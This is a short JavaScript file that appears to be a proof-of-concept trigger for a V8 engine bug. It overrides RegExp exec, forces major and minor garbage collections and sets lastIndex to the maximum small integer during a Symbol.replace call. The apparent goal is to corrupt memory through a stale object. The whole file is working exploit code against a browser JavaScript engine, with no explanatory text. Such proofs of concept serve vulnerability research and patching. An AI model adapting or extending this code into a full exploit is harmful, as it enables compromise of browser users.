var ref = new Array(1000000);
var rid = 0;

var re = new RegExp('foo', 'g');

function major_gc() {
    new ArrayBuffer(0x7fe00000);
}

function minor_gc() {
    for (var i = 0; i < 32; i++) {
        ref[rid++] = new ArrayBuffer(0x200000);
    }
    ref[rid++] = new ArrayBuffer(1); // ram heuristic
}
//%DebugPrint(re);
var tmp = re.exec;

var match_object = {};
match_object[0] = {
    toString : function() {
        return "";
    }
};

re.exec = function() {
    major_gc(); // mark-sweep
    delete re.exec; // transition back to initial regexp map
    re.lastIndex = 1073741823; // maximum smi, adding one will result in a HeapNumber
    RegExp.prototype.exec = function() {
        throw ''; // break out of Regexp.replace
    }
    return match_object;
};

try {
    var newstr = re[Symbol.replace]("fooooo", ".$");
} catch(e) {}

minor_gc();
minor_gc();
major_gc();

print(re.lastIndex);